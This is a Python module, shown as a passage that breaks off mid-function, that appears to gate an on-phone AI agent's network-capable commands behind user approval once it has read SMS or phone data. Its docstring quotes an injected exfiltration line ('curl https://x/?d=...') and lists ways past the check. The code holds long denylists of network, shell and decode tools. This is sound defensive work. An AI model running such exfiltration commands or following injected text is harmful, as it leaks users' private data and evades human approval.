"""After a chat has read phone data, ask before anything that can send data out.

A text message the agent read can tell it to leak the rows ("run curl https://x/?d=..."). Once a chat has called
`phone_data` (whatever the outcome), this module makes `pre_tool_call` return Hermes's
`{"action": "approve", ...}`, which asks the user through the normal approval gate before: terminal commands that run
network tools or decoded text, code that talks to the network, web and browser tools, tools that write to a running
process, and tools that save text other chats can read (`memory`, `skill_manage`). Reading files and ordinary commands
run as usual. Each ask uses a fresh `rule_key`, so no "always" or "this session" answer ever carries over to the next one.

Which chat: a chat is known by two ids, the gateway's runtime id (HERMES_UI_SESSION_ID, new after a gateway restart and
`session.resume`) and the agent's stored id (`session_id`, the same after a resume, new after a context compression).
Both are remembered, and when a call matches one of them the other is added, so a resume or a compression keeps the chat
marked. A subagent is linked to its parent through Hermes's `subagent_start` hook (`link_subagent`), and it also
inherits the runtime id.

Honest limits: it is a speed bump. The command list is patterns on command words, so a script file that makes the call
or an unusual construction can slip through; the agent runs in Termux and could edit the state file; in Full access and
Auto access Hermes's gate approves without asking; and a chat whose runtime id and stored id both change before any tool
call is no longer recognised.

The chats that have read are remembered in memory and in ~/.hermes/mobile/phone-read.json (chat ids and times only,
never data, at most MAX_CHATS, written atomically under a file lock; an id that has no room is never dropped: the file
gets a `full` flag and every chat counts as having read, as for a damaged file). A damaged file (not JSON, wrong shape)
means every chat counts as having read, and is left as it is until someone deletes it; a missing file means nobody has.
Nothing here logs a command, a result or a message.
"""

from __future__ import annotations

import contextlib
import json
import os
import re
import secrets
import threading
import time
from pathlib import Path
from typing import Any, Dict, Iterable, Iterator, List, Optional, Tuple

PATH = Path.home() / ".hermes" / "mobile" / "phone-read.json"
MAX_CHATS = 2000
MAX_SHOWN = 300   # characters of a command shown in the ask (the start and the end when it is longer)
MAX_SCAN = 20000  # characters of a command or script looked at
MAX_DEPTH = 4     # nested `bash -c '...'` levels looked into

_lock = threading.Lock()
_mem: Dict[str, float] = {}
_parents: Dict[str, str] = {}   # subagent stored id -> parent stored id (this process only)
_cache: tuple = (None, {})   # ((mtime_ns, inode, size), {chat: time})


def chat_ids(session_id: Any = "", task_id: Any = "") -> Tuple[str, ...]:
    """Every id this chat is known by: the gateway's runtime id (HERMES_UI_SESSION_ID, a ContextVar a subagent inherits)
    and the agent's stored id (`session_id`). Either one matching marks the chat."""
    out: List[str] = []
    try:
        from gateway.session_context import _SESSION_UI_SESSION_ID
        v = _SESSION_UI_SESSION_ID.get()
        if isinstance(v, str) and v:
            out.append(v)
    except Exception:
        pass
    for v in (session_id, task_id if not session_id else ""):
        v = str(v or "").strip()
        if v and v not in out:
            out.append(v)
    return tuple(out)


def _norm(ids: Any) -> List[str]:
    if isinstance(ids, str):
        ids = [ids]
    out: List[str] = []
    for i in ids or ():
        i = str(i or "").strip()[:200]
        if i and i not in out:
            out.append(i)
    return out


def _with_parents(ids: List[str]) -> List[str]:
    out = list(ids)
    for i in list(out):
        for _ in range(16):   # a chain of subagents
            i = _parents.get(i, "")
            if not i or i in out:
                break
            out.append(i)
    return out


def ancestors(ids: Any) -> List[str]:
    """The ids given and the ids of the chats that spawned them (this process's subagent links), the given ones first."""
    return _with_parents(_norm(ids))


def _read_file() -> Optional[Dict[str, float]]:
    """The saved chats; {} when there is no file; None when the file exists but is damaged (not JSON, no `chats` object,
    a time that is not a number, unreadable): then every chat counts as having read (fail closed, as the fallback in
    __init__.py does)."""
    try:
        text = PATH.read_text()
    except FileNotFoundError:
        return {}
    except Exception:
        return None
    try:
        d = json.loads(text)
        if isinstance(d, dict) and d.get("full") is True:
            return None   # an id had no room (MAX_CHATS): it may be a real chat, so every chat counts as having read
        raw = d.get("chats") if isinstance(d, dict) else None
        return {str(k)[:200]: float(v) for k, v in raw.items()} if isinstance(raw, dict) else None
    except Exception:
        return None


def _file_chats() -> Optional[Dict[str, float]]:
    """`_read_file`, cached until the file changes."""
    global _cache
    try:
        s = PATH.stat()
        st = (s.st_mtime_ns, s.st_ino, s.st_size)
    except OSError:
        return {}
    if _cache[0] == st:
        return _cache[1]
    chats = _read_file()
    _cache = (st, chats)
    return chats


def has_read(ids: Any) -> bool:
    """Has one of these chats (or a parent) read phone data? True for every chat while the state file is damaged."""
    ids = _with_parents(_norm(ids))
    if not ids:
        return False
    with _lock:
        known = _file_chats()
        if known is None:
            return True
        return any(i in _mem or i in known for i in ids)


@contextlib.contextmanager
def _file_lock() -> Iterator[None]:
    """An exclusive lock on a file next to the state file, so two processes can't each write over the other's entry."""
    fd = None
    try:
        import fcntl
        PATH.parent.mkdir(parents=True, exist_ok=True)
        fd = os.open(str(PATH) + ".lock", os.O_CREAT | os.O_RDWR, 0o600)
        fcntl.flock(fd, fcntl.LOCK_EX)
    except Exception:
        pass   # no locking here (no fcntl): still write, as before
    try:
        yield
    finally:
        if fd is not None:
            try:
                os.close(fd)   # closing releases the lock
            except OSError:
                pass


def mark(ids: Any) -> None:
    """This chat (every id given, and its parents) has called phone_data. Never raises."""
    ids = _with_parents(_norm(ids))
    if not ids:
        return
    try:
        with _lock:
            now = time.time()
            for i in ids:
                _mem.pop(i, None)
                _mem[i] = now
            while len(_mem) > MAX_CHATS:
                _mem.pop(next(iter(_mem)))
            try:
                with _file_lock():
                    chats = _read_file()   # read again inside the lock: another process may have added entries
                    if chats is None:
                        return   # a damaged file stays as it is (every chat counts as read); delete it to start over
                    full = len(chats) + len([i for i in ids if i not in chats]) > MAX_CHATS
                    if not full:
                        for i in ids:
                            chats[i] = now
                    PATH.parent.mkdir(parents=True, exist_ok=True)
                    tmp = PATH.with_name(PATH.name + f".{os.getpid()}.tmp")
                    # no room: never drop an old chat. The file's own `full` flag makes every chat count as having read
                    tmp.write_text(json.dumps({"chats": chats, "full": True} if full else {"chats": chats}))
                    tmp.replace(PATH)
            except Exception:
                pass   # the in-memory entry still holds for this process
    except Exception:
        pass


def adopt(ids: Any) -> List[str]:
    """A chat this module already marks (by one of these ids, or a parent's) shows up under ids it has not marked, for
    example the new stored id after a context compression: mark them all and return the ids that were new, so the caller
    can tell the app. [] for a chat that has not read (nothing to do), and while the state file is damaged (every chat
    counts as read there, but none is new). Never raises."""
    try:
        ids = _with_parents(_norm(ids))
        if not ids:
            return []
        with _lock:
            known = _file_chats() or {}
            have = [i for i in ids if i in _mem or i in known]
            missing = [i for i in ids if i not in _mem and i not in known]
        if not have or not missing:
            return []
        mark(ids)
        return missing
    except Exception:
        return []


def link_subagent(parent_id: Any, child_id: Any) -> None:
    """Hermes's `subagent_start` hook: remember who spawned whom. A child of a chat that has read is marked at once; a
    child that reads later marks its parent (`mark` follows the links). Never raises."""
    try:
        parent, child = str(parent_id or "").strip()[:200], str(child_id or "").strip()[:200]
        if not parent or not child or parent == child:
            return
        with _lock:
            if len(_parents) > MAX_CHATS:
                _parents.clear()
            _parents[child] = parent
        if has_read(parent):
            mark(child)
    except Exception:
        pass


# ── what can send data out ──────────────────────────────────────────────────

_NET_WORDS = frozenset((
    "curl wget nc ncat netcat socat ssh scp sftp rsync ftp lftp tftp telnet nmap nslookup dig host ping traceroute "
    "sendmail mail mutt msmtp ssmtp swaks mosquitto_pub aria2c lynx w3m links httpie http https xh rclone "
    "termux-sms-send termux-share termux-open termux-open-url termux-telephony-call xdg-open "
    "yt-dlp youtube-dl you-get gallery-dl gdown aria2 axel mosh autossh sshpass adb "
    "torsocks tsocks proxychains proxychains4").split())
_SHELLS = frozenset("sh bash zsh dash ash ksh csh tcsh fish".split())
_INTERP = re.compile(r"^(?:python[0-9.]*|pypy3?|node(?:js)?|deno|bun|perl|ruby|php|lua|luajit|tclsh|osascript|Rscript)$")
_ONELINER = re.compile(r"^(?:-[a-zA-Z]*[ceEr]|-p[ne]?|--eval|--exec|--print)$")   # -c -e -E -r -pe -ne --eval ...
_NET_MODULES = ("http.server", "http.client", "SimpleHTTPServer", "smtpd", "smtplib", "ftplib", "telnetlib", "poplib",
                "imaplib", "nntplib", "socket", "socketserver", "ssl", "urllib", "urllib3", "xmlrpc", "wsgiref", "webbrowser",
                "pyftpdlib", "aiohttp", "requests", "httpx", "uvicorn", "websockets", "paramiko", "asyncssh", "pycurl", "flask",
                "fastapi", "tornado", "twisted", "mitmproxy", "pyngrok", "ngrok", "gunicorn", "hypercorn", "daphne",
                "asyncio.subprocess", "pty", "cgi", "cgitb")
# Libraries an interpreter loads from a command-line flag (perl -MIO::Socket, ruby -rsocket, node -r http) that talk to the network.
_LIB_NET = {
    "perl": re.compile(r"^(?:Socket|IO::(?:Socket|Select)|LWP|HTTP::|Net::|WWW::|Mojo|AnyEvent|IPC::(?:Open[23]|Run)|Curl|"
                       r"File::Fetch|URI::Fetch|Coro|POE|Parallel::|Proc::|Expect|CGI::Fast)", re.I),
    "ruby": re.compile(r"^(?:socket|net/|open-uri|openssl|webrick|resolv|drb|open3|pty|mechanize|httparty|faraday|rest-client|"
                       r"typhoeus|excon|http|eventmachine|em-|rack|sinatra|thin|puma)", re.I),
    "node": re.compile(r"^(?:node:)?(?:https?|http2|net|tls|dgram|dns|child_process|cluster|worker_threads|repl|inspector|"
                       r"axios|node-fetch|undici|got|request|ws|socket\.io|express)\b", re.I),
}
_LIB_KIND = {"perl": "perl", "ruby": "ruby", "node": "node", "nodejs": "node", "bun": "node", "deno": "node"}
_GIT_SENDS = frozenset(("push", "clone", "fetch", "pull", "ls-remote", "send-email", "request-pull", "submodule", "svn",
                        "imap-send", "difftool", "mergetool", "daemon", "http-push", "http-fetch", "remote-http",
                        "remote-https", "remote-ext"))
_GIT_OPT_ARG = frozenset(("-C", "-c", "--git-dir", "--work-tree", "--namespace", "--super-prefix", "--config-env"))
_ASSIGN = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
_PLACEHOLDER = "\x00"   # stands in for a $(...) or backtick substitution inside a word
_DECODE = re.compile(
    r"\bbase64\b[^|;&\n]*\s-(?:d|D|-decode)\b|\bbase32\b[^|;&\n]*\s-d\b|\bxxd\b[^|;&\n]*\s-r\b|\buudecode\b"
    r"|\bopenssl\b[^|;&\n]*\benc\b[^|;&\n]*\s-d\b|\bprintf\b[^|;&\n]*\\x[0-9a-fA-F]|\bprintf\b[^|;&\n]*\\[0-7]{3}")
# wrapper command -> its options that take a value (the wrapped command comes after the options)
_WRAP: Dict[str, frozenset] = {
    "sudo": frozenset(("-u", "-g", "-h", "-p", "-C", "-D", "-R", "-T", "-U", "--user", "--group")),
    "doas": frozenset(("-u", "-C")), "env": frozenset(("-u", "-C", "--unset", "--chdir")),
    "xargs": frozenset(("-I", "-n", "-P", "-d", "-E", "-L", "-s", "-a", "-l")), "nohup": frozenset(),
    "time": frozenset(("-f", "-o")), "command": frozenset(), "exec": frozenset(("-a",)), "builtin": frozenset(),
    "nice": frozenset(("-n",)), "ionice": frozenset(("-c", "-n", "-p")), "timeout": frozenset(("-s", "-k")),
    "stdbuf": frozenset(("-i", "-o", "-e")), "setsid": frozenset(), "busybox": frozenset(), "toybox": frozenset(),
    "then": frozenset(), "do": frozenset(), "else": frozenset(), "elif": frozenset(),
    "if": frozenset(), "while": frozenset(), "until": frozenset(), "!": frozenset(), "{": frozenset(),
    "unbuffer": frozenset(), "firejail": frozenset(), "fakeroot": frozenset(("-l", "-i", "-s", "-u", "-b", "--lib", "--faked")),
}
# Commands that run another command or a command line given as text; _unwrap says which one (see there).
_EXEC_WRAP = frozenset(("flock script strace ltrace proot-distro proot chroot nsenter unshare watch parallel chrt "
                        "taskset faketime").split())
# Environment variables that name a program some command then runs (`PAGER=... man x`, `LESSOPEN='|...' less f`).
_ENV_RUNS = frozenset(("LESSOPEN LESSCLOSE MANPAGER PAGER GIT_PAGER GIT_SSH_COMMAND GIT_SSH GIT_PROXY_COMMAND GIT_ASKPASS "
                       "SSH_ASKPASS SUDO_ASKPASS RSYNC_RSH BASH_ENV PYTHONSTARTUP LD_PRELOAD PROMPT_COMMAND "
                       "GIT_EXTERNAL_DIFF").split())
# git -c KEY=VALUE keys that run a program
_GIT_CFG_RUNS = re.compile(r"^(?:alias\..+|core\.(?:sshcommand|pager|editor|fsmonitor|askpass|gitproxy|hookspath)|"
                           r"credential(?:\..+)?\.helper|sequence\.editor|diff\.external|gpg\.program|"
                           r"protocol\.ext\.allow|http\.proxy|url\..+\.insteadof|diff\..+\.textconv|"
                           r"filter\..+\.(?:clean|smudge|process)|merge\..+\.driver|pager\..+)$", re.I)
_PLAIN_PAGER = re.compile(r"^(?:/[\w./-]*/)?(?:less|more|cat|most)(?: -[A-Za-z]+)*$")
_VI = frozenset("vim vi nvim view ex vimdiff rvim rview gvim nvi neovim".split())
_INTERP_NAMES = ("python python3 pypy pypy3 node nodejs deno bun perl ruby php lua luajit tclsh osascript Rscript "
                 "awk gawk mawk find fd sqlite3 vim vi nvim gdb less man tar").split()
_RISKY_NAMES: Optional[frozenset] = None


def _risky_names() -> frozenset:
    """Program names a command word may not expand into (the denylist the glob check compares against)."""
    global _RISKY_NAMES
    if _RISKY_NAMES is None:
        _RISKY_NAMES = frozenset(_NET_WORDS | _SHELLS | set(_WRAP) | _EXEC_WRAP | _MEDIA | _PKG | _VI
                                 | {"git", "gh", "eval", "source", "su", "doas", "sudo", "python3.11", "python3.12"}
                                 | set(_INTERP_NAMES))
    return _RISKY_NAMES


_COMPRESSORS = frozenset("gzip gunzip zcat bzip2 bunzip2 bzcat xz unxz xzcat lzma unlzma lzcat zstd unzstd zstdcat zstdmt pzstd "
                         "lz4 lzop lzip pigz unpigz pbzip2 pixz plzip brotli compress uncompress".split())
_SHELL_META = re.compile(r"[;&|$`<>(){}\\!*?\n]")
# Harmless vim startup commands (`vim -c wq`): saving, quitting, going to a line, a plain option. Anything with `!`, `|`,
# `:r`, `:source`, a function call or a shell word is not here.
_VIM_SAFE = re.compile(r"^:?(?:w|wq|wa|wqa|wqall|x|xa|xall|q|qa|qall|q!|qa!|wq!|\d+|\$|noh|nohlsearch|syntax (?:on|off)|"
                       r"set +(?:no)?[a-z]+(?:=[\w.,-]*)?)$")


def _compress_prog_ok(val: str) -> bool:
    """`tar -I zstd`, `--use-compress-program='pigz -p 4'`: a known compressor with plain options."""
    words = val.split()
    return bool(words) and _base(words[0]) in _COMPRESSORS and not _SHELL_META.search(val) \
        and all(re.match(r"^-[\w=.-]*$|^\d+$", w) for w in words[1:])


def _tar_runs_program(args: List[str]) -> bool:
    for j, a in enumerate(args):
        if re.match(r"^--(?:to-command|checkpoint-action|rsh-command|info-script|new-volume-script)", a):
            return True
        val = None
        if a.startswith("--use-compress-program="):
            val = a.split("=", 1)[1]
        elif a == "--use-compress-program" and j + 1 < len(args):
            val = args[j + 1]
        elif re.match(r"^-[a-zA-Z]*I$", a) and j + 1 < len(args):
            val = args[j + 1]
        elif re.match(r"^-I.+", a):
            val = a[2:]
        elif re.match(r"^-[a-zA-Z]*F$", a) or re.match(r"^-F.+", a):
            return True
        if val is not None and not _compress_prog_ok(val):
            return True
        if a.startswith("--use-compress-program") and val is None:
            return True
    return False


def _man_runs_program(args: List[str]) -> bool:
    for j, a in enumerate(args):
        if "!" in a:
            return True
        m = re.match(r"^(?:-P|--pager)(?:=?(.*))?$", a)
        if m:
            val = m.group(1) or (args[j + 1] if j + 1 < len(args) and a in ("-P", "--pager") else "")
            if not (val and _PLAIN_PAGER.match(val)):
                return True
        elif re.match(r"^(?:-H|-B|-b|--html|--browser|--prompt)", a):
            return True
    return False


def _less_runs_program(args: List[str]) -> bool:
    return any(("!" in a or "|" in a) for a in args)


def _vim_runs_program(args: List[str]) -> bool:
    """Whether vi/vim/nvim is given something to run: -c/--cmd/+cmd with more than a harmless command, a script, silent ex mode."""
    j = 0
    while j < len(args):
        a = args[j]
        if a in ("-c", "--cmd"):
            val = args[j + 1] if j + 1 < len(args) else ""
            if not _VIM_SAFE.match(val.strip()):
                return True
            j += 2
            continue
        if a == "-u" and j + 1 < len(args) and args[j + 1] in ("NONE", "NORC"):
            j += 2   # `-u NONE`, the split form of `-uNONE`: loads no vimrc
            continue
        m = re.match(r"^\+(.*)$", a)
        if m and len(a) > 1:
            if not _VIM_SAFE.match(m.group(1).strip()):
                return True
        elif re.match(r"^(?:-S|-s|-es|-E|-u|--cmd=|-c.+)", a) and not re.match(r"^-u(?:NONE|NORC)$", a):
            return True
        j += 1
    return False


_RE_AWK_PIPE = re.compile(r'\|\s*"|\|&?\s*getline|\|&')   # `| "cmd"`, `"cmd" | getline`, `|& getline`


def _lib_arg(kind: str, args: List[str], j: int) -> Optional[Tuple[str, int]]:
    """A library an interpreter loads from a flag at args[j]: (its name, how many words the flag took), else None. perl -Mname,
    ruby -rname / -r name / --require name, node -r name / --require name / --import name."""
    a = args[j]
    if kind == "perl":
        m = re.match(r"^-[Mm](.+)$", a)
        return (m.group(1).lstrip("-"), 1) if m else None
    if kind == "ruby":
        m = re.match(r"^-r(.+)$", a)
        if m:
            return m.group(1), 1
        if a in ("-r", "--require") and j + 1 < len(args):
            return args[j + 1], 2
        if a.startswith("--require="):
            return a.split("=", 1)[1], 1
        return None
    if kind == "node":
        if a in ("-r", "--require", "--import", "--loader", "--experimental-loader") and j + 1 < len(args):
            return args[j + 1], 2
        m = re.match(r"^--(?:require|import|loader|experimental-loader)=(.+)$", a)
        return (m.group(1), 1) if m else None
    return None


def _brace_alts(base: str) -> List[str]:
    """The words a `{a,b}` brace list in `base` expands to (one list at a time, at most 64 words); ranges are left alone."""
    outs = [base]
    for _ in range(4):
        nxt: List[str] = []
        changed = False
        for w in outs:
            m = re.search(r"\{([^{}]*,[^{}]*)\}", w)
            if not m:
                nxt.append(w)
                continue
            changed = True
            for alt in m.group(1).split(","):
                nxt.append(w[:m.start()] + alt + w[m.end():])
        outs = nxt[:64]
        if not changed:
            break
    return outs


def _pattern_may_be_risky(word: str) -> bool:
    """Whether a command word with `*`, `?`, `[...]` or `{a,b}` in it could expand into the name of a program on the
    denylist. `./b?ild.sh` can't; `c?rl`, `cur[l]` and `/usr/bin/c*rl` can."""
    import fnmatch
    base = _base(word)
    for alt in _brace_alts(base):
        if not re.search(r"[*?\[]", alt):
            if alt in _risky_names():
                return True
            continue
        if any(fnmatch.fnmatchcase(n, alt) for n in _risky_names()):
            return True
    return False


def _inline_script(a: str) -> bool:
    return bool(_INLINE_PATH.match(a)) or _PROCSUB in a
_MEDIA = frozenset("ffmpeg ffprobe ffplay mpv mplayer vlc cvlc".split())   # read and write network addresses
_PKG = frozenset("pip pip3 pipx npm npx yarn pnpm cargo go gem apt apt-get pkg dpkg uv uvx".split())
_PKG_OPTS = frozenset(("--index-url --extra-index-url --find-links --proxy --https-proxy --trusted-host --registry "
                       "--source --index --git --repo").split())
_GH_LOCAL = frozenset(("help", "version", "completion", "config", "alias"))   # gh subcommands that stay on the phone
_URLISH = re.compile(r"(?<!file)://|^(?:tcp|udp|srt|rist|tls|unix|icecast|rtp|rtsp|rtmp[a-z]*|ftp|sftp)(?:\+[a-z]+)?:", re.I)
_HOME_PATH = re.compile(r"^\$\{?(?:HOME|PREFIX|PWD|TMPDIR)\}?/[\w./+-]*$")   # `$HOME/bin/tool`: a path, not a built name
_PLAIN_PATH = re.compile(r"^(?!/(?:dev|proc)/)[\w./~+-]+$")
_PROCSUB = "\x01"   # stands in for a process substitution `<(...)` or `>(...)` inside a word
# A "script" path that is really code from input: stdin, a file descriptor, `-` or a process substitution.
_INLINE_PATH = re.compile(r"^(?:-|/dev/(?:stdin|fd/\d+|tty)|/proc/(?:self|thread-self|\d+)/fd/\d+)$")
_BRACES = re.compile(r"\{[^{}]*(?:,|\.\.)[^{}]*\}")

# One command of a parsed line: (words, dyn flags, got its input from a pipe)
_Cmd = Tuple[List[str], List[bool], bool, List[str]]   # + the heredoc bodies fed to it (data, see _parse)


def _parse(text: str) -> List[_Cmd]:
    """Split shell text into simple commands, quote-aware: `;`, `&&`, `||`, `|`, newlines, `(`..`)`, `$(`..`)` and
    backticks start a new command (even inside double quotes for `$(` and backticks), and a substitution leaves a
    placeholder in the word it sits in. A rough reader, not a shell."""
    t = text[:MAX_SCAN]
    n = len(t)
    cmds: List[_Cmd] = []
    S: Dict[str, Any] = {"w": [], "d": [], "cur": [], "has": False, "dyn": False, "q": None, "piped": False, "depth": 0,
                         "body": []}
    stack: List[Tuple[str, Dict[str, Any]]] = []
    pending: List[Tuple[str, bool, bool, List[str]]] = []   # heredocs whose body starts after the next newline

    def endword() -> None:
        if S["has"]:
            S["w"].append("".join(S["cur"]))
            S["d"].append(S["dyn"])
        S["cur"], S["has"], S["dyn"] = [], False, False

    def endcmd(piped: bool = False) -> None:
        endword()
        if S["w"]:
            cmds.append((S["w"], S["d"], S["piped"], S["body"]))
        S["w"], S["d"], S["piped"], S["body"] = [], [], piped, []

    def push(kind: str) -> None:
        saved = dict(S)
        stack.append((kind, saved))
        S.update({"w": [], "d": [], "cur": [], "has": False, "dyn": False, "q": None, "piped": False, "depth": 0,
                  "body": []})

    def pop() -> None:
        endcmd()
        _kind, saved = stack.pop()
        S.clear()
        S.update(saved)
        S["cur"] = list(S["cur"]) + [_PROCSUB if _kind == "<(" else _PLACEHOLDER]
        S["has"], S["dyn"] = True, True

    i = 0
    while i < n:
        c = t[i]
        q = S["q"]
        if q == "'":
            if c == "'":
                S["q"] = None
            else:
                S["cur"].append(c)
            i += 1
            continue
        if c == "\\":
            if i + 1 < n:
                if t[i + 1] != "\n":
                    S["cur"].append(t[i + 1])
                    S["has"] = True
                i += 2
            else:
                i += 1
            continue
        if c == "$" and t.startswith("$(", i):
            push("$(")
            i += 2
            continue
        if c in "<>" and q is None and t.startswith("(", i + 1):   # a process substitution <(...) or >(...)
            push("<(")
            i += 2
            continue
        if c == "`":
            if stack and stack[-1][0] == "`":
                pop()
            else:
                push("`")
            i += 1
            continue
        if c == "$" and i + 1 < n and (t[i + 1].isalnum() or t[i + 1] in "_{"):
            S["dyn"] = True   # a variable: the word is not known
        if q == '"':
            if c == '"':
                S["q"] = None
                S["has"] = True
            else:
                S["cur"].append(c)
                S["has"] = True
            i += 1
            continue
        if c == "'":
            S["q"], S["has"] = "'", True
        elif c == '"':
            S["q"], S["has"] = '"', True
        elif c == "<" and t.startswith("<<<", i):   # a here-string: the next word is its text
            endword()
            S["w"].append("<<<")
            S["d"].append(False)
            i += 3
            continue
        elif c == "<" and t.startswith("<<", i):
            j = i + 2   # a heredoc `<<WORD`, `<<-WORD`, `<<'WORD'`: its body is text, not commands
            strip = j < n and t[j] == "-"
            j += 1 if strip else 0
            while j < n and t[j] in " \t":
                j += 1
            delim: List[str] = []
            quoted = False
            while j < n and t[j] not in " \t\r\n;|&<>()":
                ch = t[j]
                if ch in "'\"":
                    quoted = True
                    k = t.find(ch, j + 1)
                    k = n if k < 0 else k
                    delim.append(t[j + 1:k])
                    j = k + 1
                elif ch == "\\" and j + 1 < n:
                    quoted = True
                    delim.append(t[j + 1])
                    j += 2
                else:
                    delim.append(ch)
                    j += 1
            endword()
            S["w"].append("<<" + "".join(delim))
            S["d"].append(False)
            pending.append(("".join(delim), quoted, strip, S["body"]))
            i = j
            continue
        elif c in " \t\r":
            endword()
        elif c in ";\n":
            if c == "\n" and pending:
                i = _read_heredocs(t, i + 1, pending, cmds)
                pending.clear()
                endcmd()
                continue
            endcmd()
        elif c == "&":
            if t.startswith("&&", i):
                i += 1
                endcmd()
            elif t.startswith("&>", i):
                S["cur"].append(c)
                S["has"] = True
            else:
                endcmd()
        elif c == "|":
            if t.startswith("||", i):
                i += 1
                endcmd()
            elif t.startswith("|&", i):
                i += 1
                endcmd(True)
            else:
                endcmd(True)
        elif c == "(":
            S["depth"] += 1
            endcmd()
        elif c == ")":
            if S["depth"] > 0:
                S["depth"] -= 1
                endcmd()
            elif stack and stack[-1][0] in ("$(", "<("):
                pop()
            else:
                endcmd()
        elif c == "#" and not S["has"]:
            while i < n and t[i] != "\n":
                i += 1
            continue
        else:
            S["cur"].append(c)
            S["has"] = True
        i += 1
    while stack:
        pop()
    endcmd()
    return cmds


def _subs(body: str) -> List[str]:
    """The texts of `$(...)` and backtick substitutions in an unquoted heredoc body: the shell runs those."""
    out: List[str] = []
    i, n = 0, len(body)
    while i < n:
        c = body[i]
        if c == "\\":
            i += 2
        elif body.startswith("$(", i):
            depth, j = 1, i + 2
            while j < n and depth:
                depth += (body[j] == "(") - (body[j] == ")")
                j += 1
            out.append(body[i + 2:j - 1 if depth == 0 else j])
            i = j
        elif c == "`":
            j = body.find("`", i + 1)
            j = n if j < 0 else j
            out.append(body[i + 1:j])
            i = j + 1
        else:
            i += 1
    return out


def _read_heredocs(t: str, p: int, pending: List[Tuple[str, bool, bool, List[str]]], cmds: List[_Cmd]) -> int:
    """Read the bodies of the heredocs opened on the line above, from index `p`; returns where the text goes on. A body is
    data for the command it feeds (kept on that command to look at); only the substitutions inside an unquoted body run."""
    n = len(t)
    for delim, quoted, strip, sink in pending:
        lines: List[str] = []
        while p < n:
            e = t.find("\n", p)
            e = n if e < 0 else e
            line = t[p:e]
            p = e + 1
            if (line.lstrip("\t") if strip else line) == delim:
                break
            lines.append(line)
        body = "\n".join(lines)
        sink.append(body)
        if not quoted:
            for inner in _subs(body):
                cmds.extend(_parse(inner))
    return min(p, n)


def _base(word: str) -> str:
    return word.rstrip("/").rsplit("/", 1)[-1]


def _is_redirect(w: str) -> bool:
    return bool(re.match(r"^(?:\d*|&)[<>]", w))


def _split_args(args: List[str], dyn: List[bool]) -> Tuple[List[str], List[bool], bool]:
    """The arguments (and their built-at-run-time flags) without redirections, and whether the command is fed inline
    text (`<<EOF`, `<<<`)."""
    out: List[str] = []
    outd: List[bool] = []
    inline = False
    skip = False
    for k, (a, f) in enumerate(zip(args, dyn)):
        if skip:
            skip = False
            continue
        if _is_redirect(a):
            if a.startswith("<<"):
                inline = True
            if re.match(r"^(?:\d*|&)[<>]+$", a):
                skip = True   # the target (a file, a here-string, the heredoc word) is the next word
                if re.match(r"^\d*<$", a) and k + 1 < len(args) and _PROCSUB in args[k + 1]:
                    inline = True   # `bash < <(...)`: the shell reads its commands from a process substitution
            continue
        out.append(a)
        outd.append(f)
    return out, outd, inline


def _strip_wrappers(w: List[str], d: List[bool]) -> Tuple[int, Optional[Tuple[str, bool]]]:
    """Index of the command word after assignments (`X=1`) and wrappers (`sudo`, `env`, `xargs`, `busybox`...). For
    `env -S 'text'` the second value is that text with the rest of the words (and whether any part is built at run time):
    env splits it into a command line."""
    i = 0
    while i < len(w):
        x = w[i]
        if _ASSIGN.match(x):
            i += 1
            continue
        base = _base(x)
        if base not in _WRAP:
            break
        opts = _WRAP[base]
        if base == "command" and any(re.match(r"^-[a-zA-Z]*[vV][a-zA-Z]*$", y) for y in w[i + 1:i + 3]):
            return len(w), None   # `command -v curl` only looks a name up
        i += 1
        duration = base == "timeout"
        while i < len(w):
            y = w[i]
            if y == "--":
                i += 1
                break
            if base == "env" and (y == "-S" or y == "--split-string" or (y.startswith("-S") and not y.startswith("--"))
                                  or y.startswith("--split-string=")):
                if y in ("-S", "--split-string"):
                    val, k = (w[i + 1] if i + 1 < len(w) else ""), i + 2
                    dyn = d[i + 1] if i + 1 < len(d) else False
                else:
                    val, k, dyn = (y[2:] if not y.startswith("--") else y.split("=", 1)[1]), i + 1, d[i]
                return len(w), (" ".join([val] + w[k:]), dyn or any(d[k:]))
            if base == "env" and _ASSIGN.match(y):
                i += 1
            elif y.startswith("-") and y != "-":
                i += 2 if y in opts else 1
            elif duration and re.match(r"^\d", y):
                duration = False
                i += 1
            else:
                break
    return i, None


def _skip_opts(args: List[str], valued: frozenset, j: int = 0) -> int:
    """Index of the first word that is not an option (options in `valued` take the next word as their value)."""
    while j < len(args):
        a = args[j]
        if a == "--":
            return j + 1
        if a.startswith("-") and a != "-":
            j += 2 if a in valued else 1
        else:
            break
    return j


def _unwrap(base: str, args: List[str], argd: List[bool], fed: bool) -> Optional[Tuple[str, Any, Any]]:
    """What a command that runs another command runs: ("words", words, dyn flags), ("text", command line, built at run
    time?), ("ask", why, None), or None when it runs nothing (or nothing we can read)."""
    def words(j: int) -> Optional[Tuple[str, Any, Any]]:
        return ("words", args[j:], argd[j:]) if j < len(args) else None
    if base == "flock":
        for j, a in enumerate(args):   # options may come after the lock file
            if a in ("-c", "--command") and j + 1 < len(args):
                return "text", args[j + 1], argd[j + 1]
            if a.startswith("--command="):
                return "text", a.split("=", 1)[1], argd[j]
        return words(_skip_opts(args, frozenset(("-w", "-E", "--timeout", "--wait", "--conflict-exit-code"))) + 1)   # lock file, then the command
    if base == "script":
        for j, a in enumerate(args):
            if re.match(r"^-[a-zA-Z]*c$", a) or a == "--command":
                if j + 1 < len(args):
                    return "text", args[j + 1], argd[j + 1]
            elif a.startswith("--command="):
                return "text", a.split("=", 1)[1], argd[j]
            elif re.match(r"^-c.", a):
                return "text", a[2:], argd[j]
        return ("ask", "script (starts a shell on input)", None) if fed else None
    if base in ("strace", "ltrace"):
        return words(_skip_opts(args, frozenset("-e -o -p -s -u -E -I -a -P -b -O -S -X -A -l -L -n -F".split())))
    if base == "proot-distro":
        return words(args.index("--") + 1) if "--" in args else None
    if base == "proot":
        return words(_skip_opts(args, frozenset(
            "-r -R -b -B -w -q -S -k -i --rootfs --bind --cwd --qemu --kernel-release --mount".split())))
    if base == "chroot":
        return words(_skip_opts(args, frozenset(("--userspec", "--groups"))) + 1)
    if base == "nsenter":
        return words(_skip_opts(args, frozenset(("-t", "--target", "-S", "--setuid", "-G", "--setgid"))))
    if base == "unshare":
        return words(_skip_opts(args, frozenset(("--map-user", "--map-group", "--propagation", "--setgroups", "-S", "-G"))))
    if base == "watch":
        j = _skip_opts(args, frozenset(("-n", "--interval")))
        return ("text", " ".join(args[j:]), any(argd[j:])) if j < len(args) else None
    if base == "parallel":
        j = _skip_opts(args, frozenset(
